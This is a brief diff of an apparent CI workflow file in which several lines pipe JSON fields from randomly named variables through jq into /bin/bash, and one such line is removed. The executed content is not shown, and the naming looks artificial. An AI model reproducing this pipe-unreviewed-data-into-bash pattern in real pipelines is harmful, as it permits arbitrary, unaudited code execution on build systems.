@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$dr3" | jq -r .j878 | /bin/bash
           printf '%s' "$gdei5" | jq -r .odc00708 | /bin/bash
           printf '%s' "$c458" | jq -r .a594 | /bin/bash
-          printf '%s' "$g58470" | jq -r .qtgx4280 | /bin/bash
           printf '%s' "$zh597" | jq -r .ntrqx42082 | /bin/bash
 
       - name: Archive output
